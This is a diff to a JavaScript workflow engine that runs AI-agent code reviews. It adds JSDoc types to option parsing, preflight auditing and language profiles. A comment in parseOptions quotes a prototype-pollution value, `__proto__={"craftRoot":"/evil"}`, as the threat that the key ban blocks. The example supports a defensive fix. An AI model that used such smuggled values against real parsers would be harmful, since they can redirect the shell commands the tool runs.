@@ -11,6 +11,46 @@ export const meta = {
   ],
 }
 
+/**
+ * @typedef {Awaited<ReturnType<typeof reviewProfile>>} Result  one profile's facts from reviewProfile
+ * @typedef {{ sizeBucket: string, lenses: string[], maxRounds: number, verifyVotes: number, lensModel: string, isLibrary: boolean, securitySensitive: boolean, intent: string, spec: string, churn: string[] }} Plan
+ * @typedef {VerdictAnswer} Vote  one verifier verdict (model output, VERDICT_SCHEMA or one BATCH_VERDICT_SCHEMA entry)
+ * @typedef {PriorRoundAnswer} PriorRound  the loaded prior round (loader agent output)
+ * @typedef {ReturnType<typeof sliceDiff>[number]} Slice
+ * @typedef {AgentOptions & { deadlineMs?: number | undefined, breaker?: ReturnType<typeof makeDeathBreaker> | null | undefined }} AgentOpts  agent() options plus the two this engine strips; closed, so a misspelt option is a type error
+ * @typedef {{ why?: string, file?: string, severity?: string, title?: string, line?: number, source?: string, ruleId?: string, fp?: string, symbol?: string, tier?: string, disposition?: string, whyRef?: { record?: unknown, fp?: unknown }, fix?: string, whereChecked?: string, blastRadius?: string, verifySkipped?: boolean, votesDiscarded?: number, carriedUnverified?: boolean, ledgerDupOfUnverifiedPrior?: boolean, [k: string]: unknown }} Finding  a finding as a model reports it (FindingAnswer, LedgerAnswer), then as the pipeline stamps it
+ * @typedef {PreflightAnswer} Preflight  the preflight agent's answer (model output)
+ * @typedef {{ baseRef?: unknown, preflight?: Preflight | null, isLibrary?: boolean, securitySensitive?: boolean }} Ctx  what a profile's gate prompt is built from
+ * @typedef {{ id: string, lang: string, detect: (files: string[]) => boolean, diffGlobs: string[], rubricSkill: string, fpRules: string, rollupRuleIds: string[], navSkill: string, reviewerAgent: string, securityHints: string, usesLibrary: boolean, alwaysLenses: string[], safetyLens: string, scoutRules: string, gate: (ctx: Ctx) => string, depContext: (ctx: Ctx) => string, lenses: string[], lensBrief: Record<string, string> }} Profile
+ */
+/**
+ * A JSON schema handed to agent(), tagged with the shape the sandbox validates the answer into. The tag
+ * is never set at runtime; it only lets `ragent` return `T | null` for the schema it was given.
+ * @template T
+ * @typedef {{ type: string, readonly __yields?: T, [k: string]: unknown }} Schema
+ */
+/**
+ * The answers of the schema'd agents, one per schema below — each mirrors its schema's `required` and
+ * optional properties exactly.
+ * @typedef {{ runner: string, blockers: string[], missingTools: string[], ciCovers: string[], probes: Array<{ source: string, calls: number }>, partial: boolean, notes: string }} PreflightAnswer  PREFLIGHT_SCHEMA
+ * @typedef {{ severity: 'Critical' | 'High' | 'Medium' | 'Low' | 'Info', title: string, file: string, line: number, why: string, whereChecked: string, fix: string, blastRadius: string, source: string, ruleId: string, fp?: string, symbol?: string, tier?: string, disposition?: string }} FindingAnswer  FINDING_ITEM
+ * @typedef {{ fp: string, file: string, line: number, symbol: string, severity: string, tier: string, disposition: string, source: string, sources?: string[], ruleId: string, title: string, why: string, whyRef?: { record: string, fp: string } }} LedgerAnswer  LEDGER_ITEM
+ * @typedef {{ found: boolean, round: number, head: string, ledger: LedgerAnswer[], ledgerCount: number, reason: string, priorFindings: number, journalSourced: boolean, sameFpBasis?: boolean, fpBasisKnown?: boolean, priorFpRevisions?: number[], priorFpRevisionsCheck?: string }} PriorRoundAnswer  PRIOR_ROUND_SCHEMA
+ * @typedef {{ baseRef: string, files: string[], spec: string, branch: string, head: string, notes: string }} DetectAnswer  DETECT_SCHEMA
+ * @typedef {{ sizeBucket: 'small' | 'medium' | 'large', lenses: string[], isLibrary: boolean, securitySensitive: boolean, intent: string, churn: string[], notes: string, surfaces?: { crossBoundarySymbol?: boolean, wireForm?: boolean, invariantType?: boolean } }} ScoutAnswer  SCOUT_SCHEMA
+ * @typedef {{ status: 'pass' | 'fail' | 'unknown', provenance: string, failedChecks: string[], carriedChecks: string[], seedFindings: FindingAnswer[], notes: string }} GateAnswer  GATE_SCHEMA
+ * @typedef {{ lens: string, findings: FindingAnswer[] }} FindingsAnswer  FINDINGS_SCHEMA
+ * @typedef {{ refuted: boolean, citedLineMatches: boolean, reachable: boolean, premiseSupported: boolean, reason: string }} VerdictAnswer  VERDICT_SCHEMA
+ * @typedef {{ verdicts: Array<VerdictAnswer & { index: number }> }} BatchVerdictAnswer  BATCH_VERDICT_SCHEMA
+ * @typedef {{ missingLenses: string[], notes: string }} CriticAnswer  CRITIC_SCHEMA
+ * @typedef {{ changed: boolean, reason: string }} ChangedAnswer  CHANGED_SCHEMA
+ * @typedef {{ posted: number, reason: string }} PrCommentsAnswer  PR_COMMENTS_SCHEMA
+ * @typedef {{ status: 'resolved' | 'still-open' | 'cannot-tell' | 'regressed', currentLine: number, note: string, invariant: string, attack: string }} AdjudicateAnswer  ADJUDICATE_SCHEMA
+ * @typedef {{ defeated: boolean, attack: string }} AttackAnswer  ATTACK_SCHEMA
+ * @typedef {{ runDir: string, error?: string }} CheckpointAnswer  CHECKPOINT_SCHEMA
+ * @typedef {{ groups: number[][] }} DedupAnswer  DEDUP_SCHEMA
+ */
+
 // ---- args ----
 // Three plausible spellings arrive here — a real object, a JSON string, and the `key=value` form the
 // skill's own invocation line advertises — and only the first used to work. The other two fell
@@ -23,10 +63,16 @@ export const meta = {
 // otherwise turn into options nobody wrote — `base=v1 intent=review the auth refactor strict` would
 // invent `strict`, and an invented `strict` changes what the run does. A flag is written `strict=true`
 // or `--strict`; a leading dash is an unambiguous statement of intent, a bare word is not.
+/**
+ * @param {string} text
+ * @returns {{ options: Record<string, unknown>, pairs: number, ignored: string[] }}
+ */
 function parseOptions(text) {
   const pair = /(--?)?(\w[\w-]*)=("([^"]*)"|'([^']*)'|\S+)|(--)(\w[\w-]*)/g
+  /** @type {Record<string, unknown>} */
   const out = {}
   let pairs = 0
+  /** @type {string[]} */
   const ignored = []
   let m
   let cursor = 0
@@ -39,9 +85,10 @@ function parseOptions(text) {
     // Self-contained on purpose: a module-level helper would not be copied into the engines' inlined
     // regions unless it were exported, and the fence's sibling check only knows about EXPORTS — a
     // private helper reaches every engine as a ReferenceError on first use, with the gate green.
+    /** @param {string} k */
     const banned = k => k === '__proto__' || k === 'constructor' || k === 'prototype'
     if (m[7]) { if (banned(m[7])) ignored.push(m[7]); else { out[m[7]] = true; pairs++ } ; continue }
-    const key = m[2]
+    const key = /** @type {string} */ (m[2])
     // `__proto__` is a live setter on a plain object: `__proto__={"craftRoot":"/evil"}` stores no own
     // key and yet makes `A.craftRoot` read `/evil`, which is interpolated into the shell instructions
     // the logger agent is handed. The args string is model-composed, so this is the same threat shape
@@ -52,9 +99,9 @@ function parseOptions(text) {
     const quoted = m[4] ?? m[5]
     if (quoted !== undefined) { out[key] = quoted; pairs++; continue }
     try {
-      out[key] = JSON.parse(m[3])
+      out[key] = JSON.parse(/** @type {string} */ (m[3]))
     } catch {
-      out[key] = m[3]
+      out[key] = /** @type {string} */ (m[3])
     }
     pairs++
   }
@@ -63,8 +110,19 @@ function parseOptions(text) {
   return { options: out, pairs, ignored }
 }
 
+/**
+ * Normalize whatever arrived into an options object.
+ *
+ * `warn` is called with one human sentence per degradation and must not throw — engines pass their
+ * `log`. It is called on the recovered forms too, deliberately: a run that silently accepted a
+ * shape it had to repair teaches the next caller nothing.
+ *
+ * @param {unknown} args
+ * @param {(msg: string) => void} [warn]
+ * @returns {Record<string, unknown>}
+ */
 function normalizeArgs(args, warn = () => {}) {
-  if (args && typeof args === 'object' && !Array.isArray(args)) return args
+  if (args && typeof args === 'object' && !Array.isArray(args)) return /** @type {Record<string, unknown>} */ (args)
   if (typeof args !== 'string' || !args.trim()) return {}
   const text = args.trim()
   // A JSON scalar or array is not an options object, and must not be mistaken for the key=value form
@@ -83,7 +141,7 @@ function normalizeArgs(args, warn = () => {}) {
       warn('⚠️ args arrived as a non-object JSON value — ALL options ignored, running with defaults')
       return {}
     } catch (e) {
-      warn(`⚠️ args arrived as a string that looks like JSON but is not (${String((e && e.message) || e).slice(0, 60)}) — ALL options ignored, running with defaults`)
+      warn(`⚠️ args arrived as a string that looks like JSON but is not (${String((e && /** @type {{ message?: unknown }} */ (e).message) || e).slice(0, 60)}) — ALL options ignored, running with defaults`)
       return {}
     }
   }
@@ -106,15 +164,16 @@ function normalizeArgs(args, warn = () => {}) {
   return {}
 }
 // <<< craft-inline
+/** @type {Record<string, unknown>} */
 const A = normalizeArgs(args, log)
-const baseArg = A.base ? String(A.base) : ''
-const intentArg = A.intent ? String(A.intent) : ''
-const postComments = !!A.comment
-let pathArg = A.path ? String(A.path) : ''   // optional crate-scope (audit per-crate fan-out)
+const baseArg = A['base'] ? String(A['base']) : ''
+const intentArg = A['intent'] ? String(A['intent']) : ''
+const postComments = !!A['comment']
+let pathArg = A['path'] ? String(A['path']) : ''   // optional crate-scope (audit per-crate fan-out)
 // Absolute path to the repo under review, when it is NOT the directory the session runs in. Without
 // it every agent runs `git diff` wherever the session happens to sit, so craft could only ever review
 // its own checkout — reviewing a PR in another repo silently reviewed craft instead.
-let repoArg = A.repo ? String(A.repo) : ''
+let repoArg = A['repo'] ? String(A['repo']) : ''
 // `path` is a git PATHSPEC resolved against the reviewed repo; `repo` selects the repo. An ABSOLUTE
 // `path` is therefore ambiguous in the one way the sandbox cannot resolve: it is either a repo the
 // caller meant to select, or a directory INSIDE the repo they meant to narrow to — and with no disk
@@ -132,6 +191,7 @@ let ambiguousPath = ''
 // what was ordered and what was done diverge — and the person who reads the verdict is not the
 // person who reads the log. An INCOMPLETE marker is the honest rendering of "we reviewed something
 // else than you asked for", however green the findings are.
+/** @type {string[]} */
 let scopeNotRun = []
 // The reader-facing twin of `scopeNotRun`: the same refusal spelled with this run's own paths, for
 // the report. Kept apart because `notRun` is ranked by exact string (see the assignment below).
@@ -152,6 +212,7 @@ let scopeDetail = ''
 // the drop happened before all of them. Appended to the synthesized report too rather than asked of
 // the synthesis model: what the review DID NOT cover is not something a prompt may forget.
 const scopeSection = () => (scopeNotRun.length ? `\n\n## Scope\n⚠️ ${scopeDetail || scopeNotRun.join('\n⚠️ ')}\n` : '')
+/** @param {unknown} p */
 function pathSegments(p) {
   const segs = []
   for (const s of String(p).split(/[\\/]+/)) {
@@ -162,6 +223,7 @@ function pathSegments(p) {
   return segs
 }
 // The repo-relative spelling of `abs`, or null when `abs` is not inside `repo`.
+/** @param {unknown} abs @param {unknown} repo */
 function relativeToRepo(abs, repo) {
   const r = pathSegments(repo)
   const p = pathSegments(abs)
@@ -197,7 +259,7 @@ if (ABSOLUTE_PATH.test(pathArg)) {
 // CLAUDE_PLUGIN_ROOT is set for us; when the engine is launched by scriptPath from a checkout it is
 // NOT, and the `:-.` fallback would resolve against the REVIEWED repo — the script would simply not
 // be there and the whole record would be lost to a "Cannot find module". Pass craftRoot then.
-const craftRootArg = A.craftRoot ? String(A.craftRoot) : ''
+const craftRootArg = A['craftRoot'] ? String(A['craftRoot']) : ''
 // Every logger command runs as `cd <reviewed repo> && node <logger>`, so the `:-.` fallback would be
 // resolved AFTER the cd — against the reviewed repo, where the script is not. That lost every
 // checkpoint, the finalize record and the prior-round chain to "Cannot find module", silently.
@@ -210,19 +272,19 @@ const craftRootArg = A.craftRoot ? String(A.craftRoot) : ''
 // other two found their script. Deferring the call to use time is what lets all three agree.
 const loggerPreludeNow = () => loggerPrelude(craftRootArg, CRAFT_VERSION, repoArg)
 const LOGGER_PATH = '"$CRAFT_LOGGER"'
-const viaArg = A._via ? String(A._via) : ''   // set by a parent workflow (e.g. rust-audit)
-const strict = !!A.strict   // harsh maintainability mode: confirmed maintainability findings become presumptive blockers
+const viaArg = A['_via'] ? String(A['_via']) : ''   // set by a parent workflow (e.g. rust-audit)
+const strict = !!A['strict']   // harsh maintainability mode: confirmed maintainability findings become presumptive blockers
 // The pin, RAW. Normalising it here as well as in `resolveProfilePin` is what made the helper's
 // hardening unreachable: an `Array.isArray` guard here turned a scalar `languages: 'rust'` into
 // `null` (pin silently dropped, review auto-detected instead), while a `.map(String)` turned
 // `[null]` into the string `'null'` — an "unknown id" that hard-aborted the run. One normalizer:
 // `resolveProfilePin` is the single place that decides what a pin means.
-const requestedLangs = A.languages
-const freshArg = !!A.fresh   // force a full first-pass review, ignore any prior round
+const requestedLangs = A['languages']
+const freshArg = !!A['fresh']   // force a full first-pass review, ignore any prior round
 // Every Nth re-review re-scans the FULL base...HEAD diff instead of only the fix delta, so a defect in
 // code an intermediate round did not touch is re-discovered. Default 3; 1 = every re-review is a full
 // re-scan (stateless, like adversarial-review); 0 = never (pure incremental — the pre-guard behavior).
-const fullEvery = (A.fullEvery != null) ? Math.max(0, Number(A.fullEvery)) : 3
+const fullEvery = (A['fullEvery'] != null) ? Math.max(0, Number(A['fullEvery'])) : 3
 
 // A cold full-workspace build is the one step in this workflow that can run for an hour and take the
 // whole review down with it: a gate agent that sits in `cargo clippy` stops emitting, the harness
@@ -288,6 +350,8 @@ ${rows.join('\n')}
 // that asks one source three times and declares one call passes here. What the audit buys is that
 // the honest path and the disciplined path are now the same path, and that a breach has to be
 // either declared or actively misreported — where before it was neither visible nor recorded.
+/** @param {{ probes?: unknown } | null | undefined} pf  the preflight agent's structured answer (model output)
+ * @returns {string[]} */
 function auditPreflightProbes(pf) {
   if (!pf) return []
   const out = []
@@ -308,8 +372,11 @@ function auditPreflightProbes(pf) {
     out.push('preflight declared an EMPTY `probes` list — a preflight consults something by definition, and an empty declaration is not a clean one (a partial run still reports what it did)')
     return out
   }
+  /** @type {Map<string, number>} */
   const seen = new Map()
-  for (const p of probes) {
+  for (const entry of probes) {
+    // Model output: an entry may be anything, so its two fields are read as unknown.
+    const p = entry && typeof entry === 'object' ? /** @type {{ source?: unknown, calls?: unknown }} */ (entry) : null
     const id = String((p && p.source) || '').trim()
     if (!id) { out.push('a `probes` entry has no `source`'); continue }
     if (!Object.prototype.hasOwnProperty.call(PROBE_BUDGETS, id)) {
@@ -340,13 +407,14 @@ function auditPreflightProbes(pf) {
     seen.set(id, (seen.get(id) ?? 0) + calls)
   }
   for (const [id, total] of seen) {
-    const { max, what } = PROBE_BUDGETS[id]
+    const { max, what } = PROBE_BUDGETS[/** @type {keyof typeof PROBE_BUDGETS} */ (id)]
     if (max === 0 && total > 0) out.push(`forbidden probe source \`${id}\` used ${total}×: ${what}`)
     else if (total > max) out.push(`probe source \`${id}\` used ${total}×, budget ${max}: ${what}`)
   }
   return out
 }
 // <<< craft-inline
+/** @type {Schema<PreflightAnswer>} */
 const PREFLIGHT_SCHEMA = {
   type: 'object',
   additionalProperties: false,
@@ -364,6 +432,7 @@ const PREFLIGHT_SCHEMA = {
     notes: { type: 'string' },
   },
 }
+/** @param {Profile} profile @param {Ctx} ctx */
 function preflightPrompt(profile, ctx) {
   return `You are the PREFLIGHT for a ${profile.lang} review: resolve, cheaply and once, what the later steps must not rediscover. Diff base: ${ctx.baseRef ? `\`${flattenField(ctx.baseRef)}\`` : 'uncommitted changes / most recent commit'}.
 
@@ -424,6 +493,7 @@ Return runner, blockers, missingTools, ciCovers, probes, partial, notes.`
 // The fallback matches only the MARKER the prompt mandates — uppercase `PARTIAL:` — never the bare
 // word: `notes` now also carries CI CHECK NAMES (the past-the-cap list), and a green check called
 // `partial-build` matched `/\bPARTIAL\b/i` and flipped a complete preflight to 'partial'.
+/** @param {Preflight | null | undefined} pf */
 function preflightIsPartial(pf) {
   if (!pf) return false
   if (pf.partial === true) return true
@@ -431,6 +501,7 @@ function preflightIsPartial(pf) {
 }
 
 // Rendered into every downstream prompt that might run a tool, so the answer travels with the work.
+/** @param {Preflight | null | undefined} pf */
 function preflightBrief(pf) {
   // A dead preflight must NOT render as a clean one. Returning '' left the downstream prompt with no
   // preflight block at all — indistinguishable from a run where preflight said "nothing to report",
@@ -449,9 +520,11 @@ function preflightBrief(pf) {
 }
 
 // ================= language profiles (inline registry — the sandbox can't import, so profiles live here) =================
-function rustDepContext(ctx) {
+/** @param {Ctx} _ctx */
+function rustDepContext(_ctx) {
   return `8. **Dependency context** — review against the crate versions the project ACTUALLY pins, not against crates-in-the-abstract. Resolve them: \`cargo metadata --format-version 1\` (or read \`Cargo.lock\`) and match the external crates the changed files \`use\` to their locked versions. For any nontrivial dependency the diff touches, check whether the usage is correct *for that pinned version* — a since-deprecated/removed/renamed API, a changed default, a known footgun of that exact version. Consult context7 for the crate's version-specific docs instead of trusting memory. Turn a genuine version-specific misuse into a seed finding (source "dep-context", severity Medium, ruleId "DEP-001"). Known-vulnerable versions are already covered by \`cargo audit\` (ruleId "DEP-002") — do not duplicate. Best-effort: skip silently if \`cargo metadata\` fails or the diff touches no external crate.`
 }
+/** @param {Ctx} ctx */
 function rustGate(ctx) {
   return `You are establishing the mechanical gate for a Rust review, CI-aware, and collecting tool-grounded seed findings. Diff base: ${ctx.baseRef ? `\`${flattenField(ctx.baseRef)}\`` : 'uncommitted changes / most recent commit'}.
 
@@ -502,9 +575,11 @@ EVIDENCE RULE: report a check as pass/fail ONLY if you ran it yourself (quote th
 
 Set provenance to a one-line summary like "clippy/test via CI #123; fmt/audit/deny local". Put gate failures in failedChecks (NOT seedFindings). Seed findings come from clippy-pedantic / semver / semgrep / dep-context only. On every seed finding set \`ruleId\` to the matching rust-review rules.md catalog ID (e.g. "DEP-001") or "" if none fits.`
 }
-function nixDepContext(ctx) {
+/** @param {Ctx} _ctx */
+function nixDepContext(_ctx) {
   return `6. **Dependency context** — review against the flake inputs the project ACTUALLY pins. Resolve them from \`flake.lock\` (the locked \`rev\`/\`narHash\` per input). Flag inputs that are unpinned, channel-based (\`<nixpkgs>\`), or floating where they should be locked, and \`inputs.*.follows\` that should dedupe nixpkgs but don't (source "dep-context", severity Medium, ruleId "DEP-001"). Best-effort: skip silently if there is no flake.`
 }
+/** @param {Ctx} ctx */
 function nixGate(ctx) {
   return `You are establishing the mechanical gate for a Nix review and collecting tool-grounded seed findings. Diff base: ${ctx.baseRef ? `\`${flattenField(ctx.baseRef)}\`` : 'uncommitted changes / most recent commit'}.
 
@@ -538,12 +613,14 @@ const CONDITIONAL_LENSES = ['failure-windows']
 // The map is lens → the `scout.surfaces` boolean that must not be affirmatively `false` for the lens
 // to run. A missing surfaces object, a missing key, or `true` all KEEP the lens (see the gate in
 // reviewProfile): a lens is dropped only where the scout said, in so many words, the surface is absent.
+/** @type {Record<string, keyof NonNullable<ScoutAnswer['surfaces']>>} */
 const SURFACE_GATED_LENSES = { 'negative-space': 'crossBoundarySymbol', 'compat': 'wireForm', 'invariants': 'invariantType' }
 
 // A changed file on one of these paths is a CERTAIN cross-boundary signal the scout can miss: a
 // `*-contracts` crate is a published cross-crate contract, and a `/crds/` schema (a Helm chart's CRD
 // dir included) is a wire form other versions of the code read. The gate reads this to FORCE the two
 // surfaces those paths imply ON — it never turns a surface off, so it can only ever ADD a lens back.
+/** @param {unknown} f */
 function isContractOrSchemaPath(f) {
   const p = String(f || '')
   return /(^|\/)crates\/(contracts|[^/]*-contracts)\//.test(p) || /(^|\/)crds\//.test(p)
@@ -587,15 +664,16 @@ const OPTIONAL_LENSES = ['performance', 'api-idioms', 'api-boundary']
 // An unrecognised name is REFUSED LOUDLY rather than dropped: `optional=perf` that quietly buys
 // nothing, on a run whose whole point was to buy something, is the exact silence this section exists
 // to prevent — and the run would then report the lens as skipped while the caller believed otherwise.
+/** @param {unknown} raw */
 function parseOptionalRequest(raw) {
   if (raw === undefined || raw === null || raw === '' || raw === false || raw === 'false' || raw === 'none') return { lenses: [], unknown: [] }
   if (raw === true || raw === 'true' || raw === 'all') return { lenses: [...OPTIONAL_LENSES], unknown: [] }
-  const names = (Array.isArray(raw) ? raw : String(raw).split(/[\s,]+/)).map(x => String(x).trim()).filter(Boolean)
+  const names = (Array.isArray(raw) ? raw : String(raw).split(/[\s,]+/)).map((/** @type {unknown} */ x) => String(x).trim()).filter(Boolean)
   return { lenses: names.filter(n => OPTIONAL_LENSES.includes(n)), unknown: names.filter(n => !OPTIONAL_LENSES.includes(n)) }
 }
-const optionalRequest = parseOptionalRequest(A.optional)
+const optionalRequest = parseOptionalRequest(A['optional'])
 if (optionalRequest.unknown.length) {
-  log(`⚠️ optional=${JSON.stringify(A.optional)} names ${optionalRequest.unknown.join(', ')}, which is not an optional lens — the optional roster is ${OPTIONAL_LENSES.join(', ')}. Only the recognised names were admitted.`)
+  log(`⚠️ optional=${JSON.stringify(A['optional'])} names ${optionalRequest.unknown.join(', ')}, which is not an optional lens — the optional roster is ${OPTIONAL_LENSES.join(', ')}. Only the recognised names were admitted.`)
 }
 const optionalRequested = optionalRequest.lenses
 // The optional tally is DERIVED, never accumulated. `ran`/`skipped` used to be snapshotted off the
@@ -611,6 +689,7 @@ const optionalDispatched = new Set()
 // An optional lens the completeness critic named as an uncovered surface. It is NOT bought (the
 // critic is the same model whose spend this pass deliberately took out of model hands), but the
 // signal is real and must reach the reader rather than die in the filter.
+/** @type {Set<string>} */
 const optionalNamedByCritic = new Set()
 const optionalTally = () => optionalTallyFrom(results, optionalDispatched, optionalRequested)
 // Appended by `out()`, so it reaches every report that has a skipped list to show — the synthesized
@@ -648,18 +727,27 @@ const optionalSection = () => {
 // savedSurfaceDrops (lib/profile-merge.mjs), which keeps only profiles past their gate and subtracts
 // what ran elsewhere. Declared here, not where the profiles run, because out() reads it through
 // surfaceGateSection() on every early exit too — where it is simply still empty.
+/** @type {Result[]} */
 const results = []
 // The merge and the record's `gate` / `surfaceGate` fields live in lib/profile-merge.mjs (tested
 // there) and are pasted in by the craft-inline gate.
 // >>> craft-inline lib/profile-merge.mjs failedProfiles mergeGateStatus profilesRanLenses gateRecord passedProfiles savedSurfaceDrops surfaceGateRecord optionalTallyFrom
 // The profiles whose mechanical gate is red. One rule, shared by the early Block exit and the
 // recorded gate status, so the run that aborted and the record that says it aborted cannot disagree.
+/**
+ * @param {ProfileResult[]} results
+ * @returns {ProfileResult[]}
+ */
 function failedProfiles(results) {
   return results.filter(r => r.gateStatus === 'fail')
 }
 
 // Worst-of across profiles: any red gate blocks the whole review (findings can't be trusted on a
 // broken tree); green only when every profile is green; anything else is unknown.
+/**
+ * @param {ProfileResult[]} results
+ * @returns {'fail'|'pass'|'unknown'}
+ */
 function mergeGateStatus(results) {
   if (failedProfiles(results).length) return 'fail'
   return results.every(r => r.gateStatus === 'pass') ? 'pass' : 'unknown'
@@ -672,11 +760,19 @@ function mergeGateStatus(results) {
 // because a lens recovered by resurrection is marked returned there but not in the round counts.
 // A gate-failed profile carries neither, contributing nothing. A profile whose every lens agent
 // died still reads false — an under-count of its saving, never an over-claim.
+/**
+ * @param {ProfileResult[]} results
+ * @returns {boolean}
+ */
 function profilesRanLenses(results) {
   return results.some(r => (r.ranLenses || []).length > 0 || (r.lensRounds || []).some(x => x.returned > 0))
 }
 
 // The record's `gate` field: merged status, per-profile provenance, and red-but-not-ours checks.
+/**
+ * @param {ProfileResult[]} results
+ * @returns {{status: string, provenance: string, carriedChecks: string[]}}
+ */
 function gateRecord(results) {
   return {
     status: mergeGateStatus(results),
@@ -688,6 +784,10 @@ function gateRecord(results) {
 // The profiles that got PAST their mechanical gate. What a red profile planned — surface-gate
 // drops, optional scope — was never in play: it aborts before any lens can run, so nothing it
 // planned is a saving or a purchase the run declined.
+/**
+ * @param {ProfileResult[]} results
+ * @returns {ProfileResult[]}
+ */
 function passedProfiles(results) {
   return results.filter(r => r.gateStatus !== 'fail')
 }
@@ -696,6 +796,11 @@ function passedProfiles(results) {
 // profile that got PAST its mechanical gate, minus any lens that was dispatched in another profile.
 // A gate-failed profile's drops are not savings — none of its lenses could have run — so counting
 // them on a mixed run would over-claim. Each profile result carries its own `surfaceDropped`.
+/**
+ * @param {ProfileResult[]} results
+ * @param {Iterable<string>} dispatched
+ * @returns {string[]}
+ */
 function savedSurfaceDrops(results, dispatched) {
   const ran = new Set(dispatched)
   const dropped = new Set(passedProfiles(results).flatMap(r => r.surfaceDropped || []))
@@ -704,6 +809,11 @@ function savedSurfaceDrops(results, dispatched) {
 
 // The record's `surfaceGate` field: the saving above, the dispatched set, the critic-named lenses
 // that are still in the saving (a named lens that ran somewhere is not a gap), and `lensesRan`.
+/**
+ * @param {ProfileResult[]} results
+ * @param {{dispatched: Iterable<string>, namedByCritic: Iterable<string>}} opts
+ * @returns {{dropped: string[], dispatched: string[], namedByCritic: string[], lensesRan: boolean}}
+ */
 function surfaceGateRecord(results, { dispatched, namedByCritic }) {
   const dropped = savedSurfaceDrops(results, dispatched)
   const named = new Set(namedByCritic)
@@ -722,6 +832,12 @@ function surfaceGateRecord(results, { dispatched, namedByCritic }) {
 // but a requested one was asked for and not delivered, and must still read as not looked at.
 // Derived, never accumulated: the plan is not final when a profile is planned (the completeness
 // critic composes lenses later), so only the dispatch point says what ran.
+/**
+ * @param {ProfileResult[]} results
+ * @param {Iterable<string>} dispatched
+ * @param {Iterable<string>} [requested]
+ * @returns {{ran: string[], skipped: string[]}}
+ */
 function optionalTallyFrom(results, dispatched, requested = []) {
   const ran = new Set(dispatched)
   const asked = new Set(requested)
@@ -755,11 +871,12 @@ const surfaceGateSection = () => {
     + (named.length ? `\n⚠️ The completeness critic named ${named.join(', ')} as an uncovered surface for THIS diff. It was still NOT dispatched — the surface gate is the deliberate boundary, not something a model re-opens mid-run — so treat this as a visible gap, not a clean pass.\n` : '')
 }
 
+/** @type {Record<string, Profile>} */
 const PROFILES = {}
-PROFILES.rust = {
+PROFILES['rust'] = {
   id: 'rust',
   lang: 'Rust',
-  detect: (files) => files.some(f => /\.rs$/.test(f) || /(^|\/)Cargo\.toml$/.test(f)),
+  detect: (/** @type {string[]} */ files) => files.some(f => /\.rs$/.test(f) || /(^|\/)Cargo\.toml$/.test(f)),
   diffGlobs: ["'*.rs'"],
   rubricSkill: 'rust-review',
   fpRules: 'fp-rules.md', // exclusion catalog (FP-*/KEEP-*); '' for a profile that ships none
@@ -793,10 +910,10 @@ PROFILES.rust = {
     'negative-space': 'negative space / cross-surface interaction: the bug the diff ENABLES in UNCHANGED code. A new status/type/enum-variant/column that pre-existing endpoints mutate blindly; a latent bug in an unchanged helper the diff makes reachable for the first time.',
   },
 }
-PROFILES.nix = {
+PROFILES['nix'] = {
   id: 'nix',
   lang: 'Nix',
-  detect: (files) => files.some(f => /\.nix$/.test(f) || /(^|\/)flake\.lock$/.test(f)),
+  detect: (/** @type {string[]} */ files) => files.some(f => /\.nix$/.test(f) || /(^|\/)flake\.lock$/.test(f)),
   diffGlobs: ["'*.nix'", "'flake.lock'"],
   rubricSkill: 'nix-review',
   fpRules: '',
@@ -835,6 +952,7 @@ PROFILES.nix = {
 // >>> craft-inline lib/review-coverage.mjs supportedLangLabel resolveProfilePin unknownPinMessage noLanguageMessage noChangedFilesMessage INERT_EXT INERT_NAMES GENERATED_PATH GENERATED_FILE isInertUncovered materialUncovered ANCILLARY_NAMES ANCILLARY_PATH isAncillaryConfig coverageGapFiles resolveCoverage nothingToReviewMessage uncoveredNotRunNote verdictSuffix telemetryLostSection
 // The human-readable roster of what the engine can review, named in every coverage message so a
 // caller reading "nothing was reviewed" also learns what would have been.
+/** @param {Record<string, {lang: string}>} profiles */
 function supportedLangLabel(profiles) {
   return Object.values(profiles).map(p => p.lang).join('/')
 }
@@ -847,10 +965,15 @@ function supportedLangLabel(profiles) {
 // the old `includes` form tolerated a string by accident, and calling `.filter` on one threw a
 // TypeError that aborted the whole review. Degrade toward running the review, never toward crashing:
 // an unusable shape (empty list, object, number) is treated as "no pin at all".
+/**
+ * @param {Record<string, unknown>} profiles
+ * @param {unknown} requested
+ * @returns {{pinned: string[] | null, unknown: string[]}}
+ */
 function resolveProfilePin(profiles, requested) {
   if (!requested) return { pinned: null, unknown: [] }
-  const list = (Array.isArray(requested) ? requested : [requested])
-    .filter(id => typeof id === 'string')
+  const list = /** @type {unknown[]} */ (Array.isArray(requested) ? requested : [requested])
+    .filter(/** @returns {id is string} */ id => typeof id === 'string')
     .map(id => id.trim().toLowerCase())
     .filter(Boolean)
   if (!list.length) return { pinned: null, unknown: [] }
@@ -862,11 +985,21 @@ function resolveProfilePin(profiles, requested) {
   return { pinned: uniq.filter(id => !!profiles[id]), unknown: uniq.filter(id => !profiles[id]) }
 }
 
+/**
+ * @param {Record<string, unknown>} profiles
+ * @param {string[]} unknown
+ */
 function unknownPinMessage(profiles, unknown) {
+  /** @param {string[]} xs */
   const q = xs => xs.map(x => `\`${x}\``).join(', ')
   return `unknown language pin ${q(unknown)} — available: ${q(Object.keys(profiles))}`
 }
 
+/**
+ * @param {Record<string, {lang: string}>} profiles
+ * @param {number} fileCount
+ * @param {number} [materialCount]
+ */
 function noLanguageMessage(profiles, fileCount, materialCount = fileCount) {
   return `NOTHING WAS REVIEWED — none of the ${fileCount} changed file(s) match a supported language profile (this engine reviews ${supportedLangLabel(profiles)} only), and ${materialCount} of them carry reviewable content that therefore went unreviewed. This is not an approval: no lens ran and no finding could have been produced.`
 }
@@ -909,11 +1042,13 @@ const GENERATED_PATH = /(^|\/)(__generated__|generated|node_modules|vendor)\//i
 
 const GENERATED_FILE = /(\.snap|\.min\.(js|css|mjs|cjs)|\.pb\.(go|cc|h|rs|ts)|_pb2(_grpc)?\.py|\.gen\.(go|rs|ts)|\.generated\.[a-z0-9]+|\.g\.dart)$/i
 
+/** @param {unknown} f */
 function isInertUncovered(f) {
-  const base = String(f).split('/').pop().toLowerCase()
-  return INERT_EXT.test(f) || INERT_NAMES.has(base) || GENERATED_PATH.test(f) || GENERATED_FILE.test(f)
+  const base = /** @type {string} */ (String(f).split('/').pop()).toLowerCase()
+  return INERT_EXT.test(String(f)) || INERT_NAMES.has(base) || GENERATED_PATH.test(String(f)) || GENERATED_FILE.test(String(f))
 }
 
+/** @param {unknown[]} files */
 function materialUncovered(files) {
   return files.filter(f => !isInertUncovered(f))
 }
